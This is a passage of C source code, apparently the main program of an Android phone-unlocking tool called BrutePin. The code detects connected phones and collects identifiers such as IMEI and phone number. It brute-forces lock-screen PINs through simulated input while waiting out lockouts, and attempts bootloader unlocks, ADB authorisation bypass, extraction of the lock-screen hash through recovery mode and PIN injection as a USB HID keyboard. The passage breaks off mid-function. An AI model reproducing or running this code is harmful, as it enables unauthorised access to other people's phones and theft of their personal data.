#define _GNU_SOURCE
#include "util.h"
#include "usb.h"
#include "usb_raw.h"
#include "adb.h"
#include "adb_native.h"
#include "safe.h"
#include "detect.h"
#include "deep_scan.h"
#include "fastboot.h"
#include "usb_mode.h"
#include "network.h"
#include "sysfs.h"
#include "database.h"
#include "service.h"
#include "hardware.h"
#include "account.h"
#include "telephony.h"
#include "extra.h"
#include "devices.h"
#include "debug.h"
#include <ctype.h>
#include "bypass.h"
#include "chip.h"
#include "panel.h"
#include "cam.h"
#include "snd.h"
#include "pwr.h"
#include "radio.h"
#include "mem.h"
#include "sec.h"
#include "sens.h"
#include "brute.h"
#include "pincrack.h"
#include "autorun.h"
#include "menu.h"
#include "force.h"
#include "engine_connect.h"
#include "input_precision.h"
#include "screen_watch.h"
#include "perf_log.h"
#include "strategy_engine.h"
#include "adaptive_timer.h"
#include "device_profile.h"
#include "progress_engine.h"
#include "connection_mgr.h"
#include "recovery_exploit.h"
#include "usb_hid_brute.h"
#include "usb_gadget_exploit.h"
#include "adb_auth_bypass.h"
#include "fastboot_exploit.h"
#include "usb_stack_exploit.h"
#include "lock_screen_bypass.h"
#include "engine_bridge.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VERSION "1.1"

void print_full_info(const DeviceInfo *info) {
    printf("\n=====================" CYAN " DEVICE INFO " RESET "=====================\n");
    printf("  " BOLD "%-16s" RESET ": %s\n", "Vendor", info->vendor);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Model", info->model);
    printf("  " BOLD "%-16s" RESET ": %s [%s]\n", "Chipset", info->chipset_vendor, info->chipset_name);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Platform", info->platform);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Product", info->product_name);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Device", info->device_name);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Hardware", info->hardware);
    printf("  " BOLD "%-16s" RESET ": Android %s (SDK %s)\n", "OS", info->android, info->sdk);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Build ID", info->display_id);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Fingerprint", info->build_fingerprint);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Security Patch", info->security_patch);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Serial", info->serial);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Bootloader", info->bootloader);
    printf("  " BOLD "%-16s" RESET ": %s\n", "Baseband", info->baseband);
    printf("\n-- " BOLD "CPU / Memory" RESET " --\n");
    printf("  " BOLD "%-16s" RESET ": %s / %s cores / %s\n", "CPU", info->cpu_abi, info->cpu_cores, info->cpu_maxfreq);
    if (strlen(info->cpu_governor)) printf("  " BOLD "%-16s" RESET ": %s\n", "Governor", info->cpu_governor);
    if (strlen(info->cpu_minfreq)) printf("  " BOLD "%-16s" RESET ": min %s\n", "", info->cpu_minfreq);
    if (strlen(info->ram_total)) printf("  " BOLD "%-16s" RESET ": %s\n", "RAM", info->ram_total);
    if (strlen(info->storage_total)) printf("  " BOLD "%-16s" RESET ": %s\n", "Storage", info->storage_total);
    if (strlen(info->swap_total)) printf("  " BOLD "%-16s" RESET ": %s\n", "Swap", info->swap_total);
    printf("\n-- " BOLD "Display" RESET " --\n");
    if (strlen(info->screen_size)) printf("  " BOLD "%-16s" RESET ": %s\n", "Resolution", info->screen_size);
    if (strlen(info->screen_density)) printf("  " BOLD "%-16s" RESET ": %s dpi\n", "Density", info->screen_density);
    if (strlen(info->display_hz)) printf("  " BOLD "%-16s" RESET ": %s Hz\n", "Refresh", info->display_hz);
    if (strlen(info->display_hdr)) printf("  " BOLD "%-16s" RESET ": %s\n", "HDR", info->display_hdr);
    printf("\n-- " BOLD "Graphics" RESET " --\n");
    print_hardware_info(info);
    printf("\n-- " BOLD "Battery" RESET " --\n");
    if (strlen(info->battery_level)) printf("  " BOLD "%-16s" RESET ": %s%%\n", "Level", info->battery_level);
    if (strlen(info->battery_status)) printf("  " BOLD "%-16s" RESET ": %s\n", "Status", info->battery_status);
    printf("\n-- " BOLD "Network" RESET " --\n");
    print_network_info(info);
    printf("\n-- " BOLD "Kernel / System" RESET " --\n");
    print_sysfs_info(info);
    printf("\n-- " BOLD "Lockscreen" RESET " --\n");
    print_database_info(info);
    printf("  " BOLD "%-16s" RESET ": %s %s\n", "Status", info->lock_type,
           info->locked ? RED "(LOCKED)" RESET : GREEN "(UNLOCKED)" RESET);
    printf("\n-- " BOLD "Biometrics" RESET " --\n");
    if (strlen(info->biometrics)) printf("  " BOLD "%-16s" RESET ": %s\n", "Available", info->biometrics);
    else printf("  " BOLD "%-16s" RESET ": None detected\n", "Available");
    if (strlen(info->camera_info)) printf("  " BOLD "%-16s" RESET ": %s\n", "Camera", info->camera_info);
    printf("\n-- " BOLD "Telephony" RESET " --\n");
    print_telephony_info(info);
    printf("\n-- " BOLD "Services" RESET " --\n");
    print_service_info(info);
    printf("\n-- " BOLD "Accounts" RESET " --\n");
    print_account_info(info);
    printf("\n-- " BOLD "System / Security" RESET " --\n");
    print_extra_info(info);
    printf("\n-- " BOLD "Devices & Sensors" RESET " --\n");
    print_devices_info(info);
    printf("\n-- " BOLD "Debug / Boot" RESET " --\n");
    print_debug_info(info);
    printf("\n-- " BOLD "Bypass Vectors" RESET " --\n");
    print_bypass_info(info);
    printf("\n-- " BOLD "SoC / Chipset" RESET " --\n");
    print_chip_info(info);
    printf("\n-- " BOLD "Display Panel" RESET " --\n");
    print_panel_info(info);
    printf("\n-- " BOLD "Camera System" RESET " --\n");
    print_cam_info(info);
    printf("\n-- " BOLD "Audio System" RESET " --\n");
    print_snd_info(info);
    printf("\n-- " BOLD "Power & Battery" RESET " --\n");
    print_pwr_info(info);
    printf("\n-- " BOLD "Connectivity" RESET " --\n");
    print_radio_info(info);
    printf("\n-- " BOLD "Storage & RAM" RESET " --\n");
    print_mem_info(info);
    printf("\n-- " BOLD "Security" RESET " --\n");
    print_sec_info(info);
    printf("\n-- " BOLD "Sensors" RESET " --\n");
    print_sens_info(info);
    printf("============================================================\n");
}

static int device_connected(void) {
    /* Check ALL modes, not just ADB */
    ModeInfo modes[4];
    int n = detect_all_modes(modes, 4);
    if (n > 0) return 1;
    /* Also try ADB explicitly */
    return adb_init() && adb_check();
}

int main(int argc, char **argv) {
    if (argc < 2) {
        banner();

        loading_spinner("[*] Scanning for USB device", 3);

        /* First: raw USB scan (no ADB needed) */
        UsbRawDevice usb_devs[USBRAW_MAX_DEVICES];
        int ndev = usb_raw_scan_all(usb_devs, USBRAW_MAX_DEVICES);
        int android_found = 0;
        for (int i = 0; i < ndev; i++) {
            if (usb_devs[i].has_adb || usb_devs[i].has_fastboot ||
                usb_devs[i].has_mtp || usb_devs[i].has_rndis ||
                vendor_by_vid(usb_devs[i].idVendor)) {
                android_found = 1;
                break;
            }
        }
        /* Cleanup USB devices */
        for (int i = 0; i < ndev; i++) usb_raw_close(&usb_devs[i]);

        if (!android_found) {
            printf("[-] No Android device detected.\n");
            printf("[*] Connect USB cable and ensure device is powered.\n");
            printf("[*] Try: --auto mode for extended scanning.\n");
            return 1;
        }

        /* Try ADB */
        int adb_ok = 0;
        if (adb_init()) {
            adb_ok = adb_check() || (adb_wait(5) > 0);
        }

        if (!adb_ok) {
            printf("[!] ADB not available. Using USB/Fastboot deep scan.\n");
            DeviceInfo noadb_info;
            deep_scan_no_adb(&noadb_info);

            /* Show what we found (skip safe_detect_all — it needs ADB) */
            printf("\n" BOLD "=== Device Info (USB/Fastboot) ===" RESET "\n");
            printf("  Vendor    : %s\n", noadb_info.vendor[0] ? noadb_info.vendor : "?");
            printf("  Model     : %s\n", noadb_info.model[0] ? noadb_info.model : "?");
            printf("  Serial    : %s\n", noadb_info.serial[0] ? noadb_info.serial : "?");
            printf("  Chipset   : %s %s\n", noadb_info.chipset_vendor[0] ? noadb_info.chipset_vendor : "?",
                   noadb_info.chipset_name[0] ? noadb_info.chipset_name : "?");
            printf("  Detected  : %s\n", noadb_info.detected_via[0] ? noadb_info.detected_via : "USB");
            printf("  Locked    : %s (default, no ADB)\n", "YES");

            /* Check fastboot */
            ModeInfo fm;
            if (detect_fastboot_mode(&fm)) {
                printf(GREEN "\n[!] Fastboot mode available!\n" RESET);
                printf("[*] Attempting bootloader unlock...\n");
                FastbootExploit fe;
                fb_init(&fe);
                if (fb_connect(&fe)) {
                    fb_getvar_all(&fe);
                    fb_print_info(&fe);
                    if (!fe.boot_unlocked) {
                        printf("[*] Trying known OEM unlock methods...\n");
                        if (fb_oem_brand_unlock(&fe, noadb_info.vendor) ||
                            fb_unlock_bootloader(&fe)) {
                            printf(GREEN "[+] Bootloader unlocked!\n" RESET);
                            printf("[*] Rebooting device...\n");
                            fb_disconnect(&fe);
                            fastboot_reboot();
                            sleep(10);
                            adb_ok = adb_init() && (adb_wait(5) > 0);
                        }
                    }
                    fb_disconnect(&fe);
                }
            }

            /* Try USB mode switching */
            printf("\n[*] Attempting to switch USB mode...\n");
            for (int i = 0; i < ndev; i++) {
                UsbRawDevice tmp;
                if (usb_raw_open_device(usb_devs[i].bus, usb_devs[i].dev_num, &tmp) > 0) {
                    if (tmp.idVendor == 0x18d1 || tmp.idVendor == 0x04e8 || tmp.idVendor == 0x2717
                        || tmp.idVendor == 0x12d1 || tmp.idVendor == 0x22d9 || tmp.idVendor == 0x2d95) {
                        int changed = usb_mode_try_switch(&tmp.dev);
                        usb_raw_close(&tmp);
                        if (changed) break;
                    } else {
                        usb_raw_close(&tmp);
                    }
                }
            }

            /* Recheck ADB after mode switch */
            if (adb_init() && adb_check()) {
                printf(GREEN "[+] ADB now available!\n" RESET);
                adb_ok = 1;
            } else {
                printf("\n" YELLOW "Summary:" RESET "\n");
                printf("  Device connected via USB: YES\n");
                printf("  ADB debugging: DISABLED\n");
                if (noadb_info.vendor[0])
                    printf("  %s %s (serial: %s)\n", noadb_info.vendor, noadb_info.model, noadb_info.serial);
                printf("\n" YELLOW "Options:" RESET "\n");
                printf("  1. Enable USB debugging on the phone\n");
                printf("  2. Boot to recovery (Power+Vol Up)\n");
                printf("  3. Use fastboot to unlock bootloader\n");
                printf("  4. Use AOA HID brute (Android 3.1+, no ADB)\n");
                printf("\n  Try: brutepin --auto\n");
                return 1;
            }
        }

        if (adb_ok) {
            loading_spinner("[*] Establishing ADB session", 2);
            if (!adb_init() || !adb_check()) {
                int st = adb_state();
                if (st == 1) {
                    printf("[!] Device unauthorized. Try recovery mode.\n");
                    force_try_recovery();
                    if (adb_state() < 2) { printf("[-] Still no access.\n"); return 1; }
                } else {
                    printf("[-] ADB error.\n");
                    return 1;
                }
            }

            printf("[+] Device connected.\n");

            DeviceInfo info;
            safe_detect_all(&info);
            print_full_info(&info);

            /* Deep hardware scan */
            auto_pwn_scan_full(NULL, 0);

            if (!info.locked) {
                printf(GREEN "[+] Device is not locked!\n" RESET);
                return 0;
            }

            int plen = menu_choose_pin_length();
            if (plen == 99) {
                plen = (info.pin_len == 4 || info.pin_len == 6 || info.pin_len == 8)
                        ? info.pin_len : 4;
                printf("\n[*] Smart mode: %d-digit\n", plen);
                return brute_smart(&info, plen, 3) ? 0 : 1;
            }
            printf("\n[*] Launching %d-digit brute force...\n", plen);
            return brute_pin(plen, 3, -1, -1, 0, 1) ? 0 : 1;
        }

        return 1;
    }

    int  mode = 0;
    int  delay = 3;
    long start = -1, end = -1;
    int  resume = 0, quiet = 0;
    char wordlist[1024] = {0};
    int  list_mode = 0, info_mode = 0, full_mode = 0, bypass_mode = 0, direct_mode = 0, auto_mode = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "smart")) mode = 99;
        else if (!strcmp(argv[i], "pattern")) mode = 'p';
        else if (!strcmp(argv[i], "w")) mode = 'w';
        else if (!strcmp(argv[i], "auto")) { auto_mode = 1; }
        else if (isdigit(argv[i][0])) {
            int n = atoi(argv[i]);
            if (n >= 1 && n <= 10) mode = n;
        }
        else if (!strcmp(argv[i], "--list")) list_mode = 1;
        else if (!strcmp(argv[i], "--info")) info_mode = 1;
        else if (!strcmp(argv[i], "--full")) full_mode = 1;
        else if (!strcmp(argv[i], "--bypass")) bypass_mode = 1;
        else if (!strcmp(argv[i], "--direct")) direct_mode = 1;
        else if (!strcmp(argv[i], "--quiet")) quiet = 1;
        else if (!strcmp(argv[i], "--wait") || !strcmp(argv[i], "-W")) {
            printf("[*] --wait: use 'auto' mode to auto-detect device.\n");
        }
        else if (!strcmp(argv[i], "--version"))
            { printf("BrutePin v%s\n", VERSION); return 0; }
        else if (!strcmp(argv[i], "-d") && i+1 < argc) delay = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-s") && i+1 < argc) start = atol(argv[++i]);
        else if (!strcmp(argv[i], "-e") && i+1 < argc) end = atol(argv[++i]);
        else if (!strcmp(argv[i], "-r")) resume = 1;
        else if (!strcmp(argv[i], "-f") && i+1 < argc) strncpy(wordlist, argv[++i], sizeof(wordlist)-1);
        else if (!strcmp(argv[i], "--adb-shell") && i+1 < argc) {
            if (!adb_init()) { fprintf(stderr, "[-] ADB init failed.\n"); return 1; }
            if (adb_state() < 2) { fprintf(stderr, "[-] No ADB device.\n"); return 1; }
            char result[16384];
            adb_native_shell(argv[++i], result, sizeof(result));
            printf("%s", result);
            return 0;
        }
        else if (!strcmp(argv[i], "--try-pin") && i+1 < argc) {
            const char *pin = argv[++i];
            if (!adb_init()) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            if (adb_state() < 2) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            prec_init(adb_get_screen_w(), adb_get_screen_h());
            DeviceInfo pinfo;
            safe_detect_all(&pinfo);
            GridPreset pg = prec_detect_grid(pinfo.vendor, pinfo.model);
            prec_set_grid(pg);
            int r = prec_enter_pin_fast(pin);
            if (r == 0) { printf("OK %s\n", pin); return 0; }
            r = prec_enter_pin(pin);
            if (r == 0) { printf("OK %s\n", pin); return 0; }
            printf("FAIL %s\n", pin); return 1;
        }
        else if (!strcmp(argv[i], "--enter-pin") && i+1 < argc) {
            const char *pin = argv[++i];
            if (!adb_init()) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            if (adb_state() < 2) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            prec_init(adb_get_screen_w(), adb_get_screen_h());
            DeviceInfo einfo;
            safe_detect_all(&einfo);
            GridPreset eg = prec_detect_grid(einfo.vendor, einfo.model);
            prec_set_grid(eg);
            prec_wake_and_swipe();
            int r = prec_enter_pin(pin);
            if (r == 0) { printf("OK %s\n", pin); return 0; }
            r = prec_enter_pin_sakti(pin);
            if (r == 0) { printf("OK %s\n", pin); return 0; }
            printf("FAIL %s\n", pin); return 1;
        }
        else if (!strcmp(argv[i], "--batch") && i+3 < argc) {
            int digits = atoi(argv[++i]);
            atoi(argv[++i]); /* delay_ms — unused, adaptive */
            long start = atol(argv[++i]);
            long end = atol(argv[++i]);
            if (!adb_init()) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            if (adb_state() < 2) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            long total = 1; for (int d = 0; d < digits; d++) total *= 10;
            if (end <= 0 || end > total) end = total;
            if (start < 0) start = 0;

            /* ── 1. Deep scan for full device info ── */
            DeviceInfo info;
            safe_detect_all(&info);

            /* ── 1b. Deep hardware scan (C++ engines) ── */
            printf("\n" BOLD "[*] Running deep hardware scanner..." RESET "\n");
            auto_pwn_scan_full(NULL, 0);

            /* ── 2. Build device profile ── */
            DeviceProfile dp;
            dprof_build(&dp, &info);
            int scr_w = 1080, scr_h = 2400;
            {
                const char *s = strchr(info.screen_size, 'x');
                if (s) {
                    char tmp[64];
                    strncpy(tmp, info.screen_size, sizeof(tmp)-1);
                    char *xp = strchr(tmp, 'x');
                    if (xp) { *xp = 0; scr_w = atoi(tmp); scr_h = atoi(xp+1); }
                }
            }
            prec_init(scr_w, scr_h);

            /* ── 3. Auto-configure grid preset ── */
            GridPreset gpreset = (GridPreset)dprof_detect_grid(info.vendor, info.model);
            prec_set_grid(gpreset);
            double base_delay = dprof_recommend_delay(&dp);

            /* ── 4. Configure strategy ── */
            StrategyConfig strat;
            strat_init(&strat, digits);
            strat.delay_ms = (int)base_delay;

            printf("\n" BOLD "=== Smart Batch Mode ===" RESET "\n");
            printf("  Device  : %s %s\n", dp.brand, info.model);
            printf("  Grid    : %s\n", prec_preset_name(gpreset));
            printf("  Delay   : %.0fms (base) | adaptif\n", base_delay);
            printf("  Metode  : Fast(%s) + Full(%s) + Sakti\n\n",
                   "KEYEVENT", "TAP+TEXT");

            /* ── 5. Print strategy plan ── */
            strat_print_plan(&strat, &info);

            /* ── 6. Initialize engines ── */
            AdaptiveTimer atimer;
            atimer_init(&atimer, base_delay);
            ProgressTracker pt;
            ptrack_init(&pt, end - start);
            ScreenState sw;
            sw_init(&sw);
            sw_start(&sw);  /* Background monitor */
            PerfLog plog;
            perf_init(&plog);

            BrutePhase phase = PHASE_AI_MARKOV;
            PhaseStats pstats = {PHASE_AI_MARKOV, 0, 0, 0.0, 0.0, 1};
            long phase_idx = 0;
            long global_idx = 0;

            printf("\n" BOLD "[*] Memulai brute force...\n" RESET);
            fflush(stdout);

            /* ── 7. Main brute loop ── */
            while (phase < PHASE_DONE) {
                char pin[16];
                int got = strat_next_pin(phase, phase_idx, pin, sizeof(pin), &info);
                if (!got) {
                    /* Phase exhausted, move to next */
                    phase_idx = 0;
                    phase = (BrutePhase)((int)phase + 1);
                    pstats.phase = phase;
                    pstats.attempts = 0;
                    pstats.successes = 0;
                    if (phase < PHASE_DONE) {
                        printf("\n" CYAN "[*] Beralih ke fase: %s" RESET "\n",
                               strat_phase_name(phase));
                        fflush(stdout);
                    }
                    continue;
                }

                global_idx++;
                long attempt = global_idx;
                double recommended = atimer_get_delay(&atimer);
                int lockout_detected = 0;

                /* Wake screen periodically */
                if (attempt % 50 == 0) prec_wake_and_swipe();

                /* ── Attempt PIN ── */
                double t_before = (double)clock() / CLOCKS_PER_SEC;
                int result;
                if (global_idx < 10000) {
                    result = prec_enter_pin_fast(pin);
                    if (result != 0 && global_idx < 500)
                        result = prec_enter_pin(pin);
                } else {
                    result = prec_enter_pin_fast(pin);
                    if (result != 0)
                        result = prec_enter_pin(pin);
                }
                double t_after = (double)clock() / CLOCKS_PER_SEC;
                double response_ms = (t_after - t_before) * 1000.0;

                /* ── Found! ── */
                if (result == 0) {
                    sw_stop(&sw);
                    printf("\n" GREEN "[!!!] PIN FOUND: " BOLD "%s" RESET "\n", pin);
                    printf(GREEN "[!!!] Percobaan ke-%ld | Fase: %s" RESET "\n",
                           attempt, strat_phase_name(phase));
                    ptrack_found(&pt, attempt);
                    ptrack_print_summary(&pt);
                    perf_log_attempt(&plog, pin, 1, sw.screen_on, sw.locked,
                                     sw.lockout_remaining, sw.lock_type);
                    perf_print_summary(&plog);
                    return 0;
                }

                /* ── Check screen state ── */
                {
                    ScreenState cur;
                    sw_get_state(&sw, &cur);
                    if (cur.lockout_remaining > 0) {
                        lockout_detected = 1;
                        int sec = cur.lockout_remaining;
                        if (sec > 120) sec = 120;
                        printf("\n" YELLOW "[!] Lockout %ds  (fase: %s, PIN: %s)" RESET,
                               sec, strat_phase_name(phase), pin);
                        fflush(stdout);
                        for (int w = 0; w < sec; w++) { printf("."); fflush(stdout); sleep(1); }
                        printf("\n");
                        ptrack_lockout(&pt, sec);
                    }
                }

                /* ── Record stats ── */
                pstats.attempts++;
                pstats.avg_time_ms = (pstats.avg_time_ms * (pstats.attempts - 1) + response_ms)
                                    / pstats.attempts;
                atimer_record(&atimer, recommended, lockout_detected, response_ms);
                ptrack_tick(&pt);

                perf_log_attempt(&plog, pin, result == 0 ? 1 : 0,
                                 sw.screen_on, sw.locked,
                                 lockout_detected ? sw.lockout_remaining : 0,
                                 sw.lock_type);

                /* ── Adaptive delay ── */
                if (recommended > 0)
                    usleep((useconds_t)(recommended * 1000.0));

                /* ── Verbose output every 10 attempts ── */
                if (attempt % 10 == 0) {
                    char screen_info[128];
                    sw_status_str(&sw, screen_info, sizeof(screen_info));
                    printf("\n" CYAN "[%ld]" RESET " Fase:%-14s | %s | Grid:%-8s | %s",
                           attempt, strat_phase_name(phase),
                           pin, prec_preset_name(gpreset),
                           screen_info);
                    fflush(stdout);
                    ptrack_print_verbose(&pt, pin, screen_info, digits);
                } else if (attempt % 5 == 0) {
                    ptrack_print_status(&pt, pin, strat_phase_name(phase));
                }

                /* ── Phase switching ── */
                if (strat_should_switch(&pstats, &strat)) {
                    printf("\n" YELLOW "[*] Fase %s: success rate %.1f%% — switching" RESET "\n",
                           strat_phase_name(phase),
                           pstats.attempts > 0 ?
                           100.0 * pstats.successes / pstats.attempts : 0.0);
                    phase_idx = 0;
                    phase = (BrutePhase)((int)phase + 1);
                    pstats.phase = phase;
                    pstats.attempts = 0;
                    pstats.successes = 0;
                } else {
                    phase_idx++;
                }

                /* ── State save ── */
                if (attempt % 500 == 0)
                    ptrack_save(&pt, STATE_FILE);

            } /* while phase */

            /* ── 8. Not found — summary ── */
            sw_stop(&sw);
            printf("\n" YELLOW "\n[-] PIN tidak ditemukan." RESET "\n");
            ptrack_print_summary(&pt);
            perf_print_summary(&plog);
            return 1;
        }
        else if (!strcmp(argv[i], "--deep-scan")) {
            DeviceInfo info;
            memset(&info, 0, sizeof(info));

            /* First try ADB */
            int adb_ok = adb_init() && adb_state() >= 2;

            /* If ADB unauthorized, try connection manager */
            if (!adb_ok) {
                ConnectionMgr cm;
                mgr_init(&cm);
                if (mgr_auto_connect(&cm, 15)) {
                    adb_ok = (cm.state == MGR_ADB_AUTHORIZED || cm.state == MGR_RECOVERY_ADB);
                    if (adb_ok) {
                        strncpy(info.vendor, cm.vendor, sizeof(info.vendor)-1);
                        strncpy(info.model, cm.model, sizeof(info.model)-1);
                        strncpy(info.serial, cm.serial, sizeof(info.serial)-1);
                        strncpy(info.screen_size, cm.screen_size, sizeof(info.screen_size)-1);
                    }
                }
            }

            if (!adb_ok) {
                /* Try USB-only deep scan */
                printf("[!] ADB unavailable. Using USB/Fastboot deep scan.\n");
                deep_scan_no_adb(&info);
                /* Output minimal JSON for Python parser */
                printf("-----JSON_BEGIN-----\n");
                printf("{\"vendor\":\"%s\",\"model\":\"%s\",\"serial\":\"%s\"",
                       info.vendor, info.model, info.serial);
                printf(",\"android\":\"%s\",\"sdk\":\"%s\"", info.android, info.sdk);
                printf(",\"screen\":\"%s\"", info.screen_size);
                printf(",\"lock_type\":\"%s\",\"locked\":%s", info.lock_type, info.locked?"true":"false");
                printf(",\"detected_via\":\"USB\"");
                printf("}\n");
                return 0;
            }

            safe_detect_all(&info);
            /* Build device profile */
            DeviceProfile dp;
            dprof_build(&dp, &info);
            /* Print formatted info */
            print_full_info(&info);
            /* Print profile */
            dprof_print(&dp);
            /* Print JSON for Python parsing */
            printf("\n-----JSON_BEGIN-----\n");
            printf("{\"vendor\":\"%s\",\"model\":\"%s\",\"serial\":\"%s\"", info.vendor, info.model, info.serial);
            printf(",\"android\":\"%s\",\"sdk\":\"%s\"", info.android, info.sdk);
            printf(",\"build_id\":\"%s\",\"fingerprint\":\"%s\"", info.display_id, info.build_fingerprint);
            printf(",\"security_patch\":\"%s\",\"bootloader\":\"%s\"", info.security_patch, info.bootloader);
            printf(",\"baseband\":\"%s\",\"hardware\":\"%s\"", info.baseband, info.hardware);
            printf(",\"platform\":\"%s\",\"product\":\"%s\",\"device\":\"%s\"", info.platform, info.product_name, info.device_name);
            printf(",\"chipset_vendor\":\"%s\",\"chipset_name\":\"%s\"", info.chipset_vendor, info.chipset_name);
            printf(",\"cpu_abi\":\"%s\",\"cpu_cores\":\"%s\",\"cpu_maxfreq\":\"%s\"", info.cpu_abi, info.cpu_cores, info.cpu_maxfreq);
            printf(",\"ram\":\"%s\",\"storage\":\"%s\"", info.ram_total, info.storage_total);
            printf(",\"screen\":\"%s\",\"density\":\"%s\"", info.screen_size, info.screen_density);
            printf(",\"gpu\":\"%s\",\"display_hz\":\"%s\"", info.gpu, info.display_hz);
            printf(",\"kernel\":\"%s\",\"selinux\":\"%s\"", info.kernel, info.selinux_mode);
            printf(",\"battery\":\"%s\",\"battery_status\":\"%s\"", info.battery_level, info.battery_status);
            printf(",\"imei1\":\"%s\",\"imei2\":\"%s\",\"phone\":\"%s\"", info.imei1, info.imei2_2, info.phone_number);
            printf(",\"lock_type\":\"%s\",\"locked\":%s,\"pin_len\":%d", info.lock_type, info.locked?"true":"false", info.pin_len);
            printf(",\"biometrics\":\"%s\",\"camera\":\"%s\"", info.biometrics, info.camera_info);
            printf(",\"detected_via\":\"%s\"", info.detected_via);
            printf(",\"profile_brand\":\"%s\",\"profile_grid\":%d,\"profile_delay\":%.0f", dp.brand, dp.grid_preset, dp.recommended_delay_ms);
            printf("}\n");
            return 0;
        }
        else if (!strcmp(argv[i], "--screen-info")) {
            if (!adb_init()) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            if (adb_state() < 2) { fprintf(stderr, "ADB_FAIL\n"); return 1; }
            char lock_info[4096] = {0};
            adb_lock_screen_info(lock_info, sizeof(lock_info));
            char lock_type[64] = {0};
            adb_lock_type_detect(lock_type, sizeof(lock_type));
            int locked = !adb_is_unlocked();
            int screen_on = adb_screen_is_on();
            printf("{\"locked\":%s,\"lock_type\":\"%s\",\"screen_on\":%s,\"info\":\"%s\"}\n",
                   locked?"true":"false", lock_type, screen_on?"true":"false", lock_info);
            return 0;
        }
        else if (!strcmp(argv[i], "--conn-mgr")) {
            ConnectionMgr cm;
            mgr_init(&cm);
            mgr_auto_connect(&cm, 15);
            mgr_print_status(&cm);
            return cm.state >= MGR_USB_DETECTED ? 0 : 1;
        }
        else if (!strcmp(argv[i], "--recovery-info")) {
            RecoveryExploit re;
            rec_init(&re);
            rec_detect(&re);
            rec_print_info(&re);
            return 0;
        }
        else if (!strcmp(argv[i], "--recovery-boot")) {
            RecoveryExploit re;
            rec_init(&re);
            if (rec_boot_recovery(&re)) {
                printf("[*] Recovery boot initiated. Waiting for ADB...\n");
                if (rec_check_adb(&re)) {
                    printf(GREEN "[+] ADB active in recovery!\n" RESET);
                    rec_detect(&re);
                    rec_print_info(&re);
                    char hash[1024];
                    if (rec_extract_password(&re, hash, sizeof(hash)))
                        printf("  Hash: %s\n", hash);
                    char ls[4096];
                    if (rec_extract_lockscreen_info(&re, ls, sizeof(ls)))
                        printf("  LockScreen: %s\n", ls);
                    return 0;
                }
                printf(RED "[-] No ADB in recovery.\n" RESET);
                return 1;
            }
            printf(RED "[-] Cannot boot recovery.\n" RESET);
            return 1;
        }
        else if (!strcmp(argv[i], "--hid-brute") && i+1 < argc) {
            const char *pin = argv[++i];
            /* Scan USB for Android device */
            UsbRawDevice devs[16];
            int n = usb_raw_scan_all(devs, 16);
            int found = 0;
            for (int j = 0; j < n; j++) {
                if (vendor_by_vid(devs[j].idVendor)) {
                    UsbHidBrute hid;
                    if (hid_init(&hid, devs[j].bus, devs[j].dev_num)) {
                        printf("[*] AOA handshake...\n");
                        if (hid_aoa_handshake(&hid)) {
                            printf("[*] AOA activated! Waiting for re-enumeration...\n");
                            sleep(3);
                            /* Re-scan for accessory device */
                            UsbRawDevice adevs[16];
                            int an = usb_raw_scan_all(adevs, 16);
                            for (int k = 0; k < an; k++) {
                                if (adevs[k].idVendor == 0x18D1 &&
                                    (adevs[k].idProduct == 0x2D00 || adevs[k].idProduct == 0x2D01)) {
                                    hid_close(&hid);
                                    hid_init(&hid, adevs[k].bus, adevs[k].dev_num);
                                    printf("[+] AOA accessory mode!\n");
                                    if (hid_aoa_register_hid(&hid)) {
                                        printf("[+] HID keyboard registered!\n");
                                        printf("[*] Sending PIN: %s\n", pin);
                                        if (hid_try_pin(&hid, pin)) {
                                            printf("[+] PIN sent via HID!\n");
                                        }
                                    }
                                    break;
                                }
                            }
                        } else {
                            printf("[-] AOA not supported on this device.\n");
                        }
                        hid_close(&hid);
                    }
                    found = 1;
                    break;
                }
            }
            if (!found) printf("[-] No Android device found.\n");
            return 0;
        }
        else if (!strcmp(argv[i], "--gadget-exploit")) {
            UsbGadgetExploit ge;
            gadget_init(&ge);
            if (gadget_detect(&ge)) {
                gadget_print_info(&ge);
                if (gadget_switch_to_adb(&ge))
                    printf(GREEN "[+] ADB mode forced via gadget!\n" RESET);
                else if (gadget_switch_to_hid(&ge))
                    printf(GREEN "[+] HID mode forced via gadget!\n" RESET);
            } else {
                printf(RED "[-] No gadget support detected.\n" RESET);
            }
            return 0;
        }
        else if (!strcmp(argv[i], "--bypass-adb")) {
            AdbAuthBypass ab;
            auth_init(&ab);
            auth_load_local_keys(&ab);
            if (adb_init() && adb_state() >= 2) {
                DeviceInfo abinfo;
                safe_detect_all(&abinfo);
                strncpy(ab.android_version, abinfo.android, sizeof(ab.android_version)-1);
                ab.sdk_version = atoi(abinfo.sdk);
                char tmp[128];
                adb_native_getprop("ro.debuggable", tmp, sizeof(tmp));
                strncpy(ab.ro_debuggable, tmp, sizeof(ab.ro_debuggable)-1);
                adb_native_getprop("ro.secure", tmp, sizeof(tmp));
                strncpy(ab.ro_secure, tmp, sizeof(ab.ro_secure)-1);
                adb_native_getprop("ro.adb.secure", tmp, sizeof(tmp));
                strncpy(ab.ro_adb_secure, tmp, sizeof(ab.ro_adb_secure)-1);
            }
            if (auth_full_bypass(&ab)) {
                printf(GREEN "[+] ADB access obtained!\n" RESET);
            } else {
                printf(RED "[-] ADB bypass failed.\n" RESET);
            }
            auth_print_report(&ab);
            return ab.adb_unlocked ? 0 : 1;
        }
        else if (!strcmp(argv[i], "--fb-ex")) {
            FastbootExploit fe;
            fb_init(&fe);
            if (fb_connect(&fe)) {
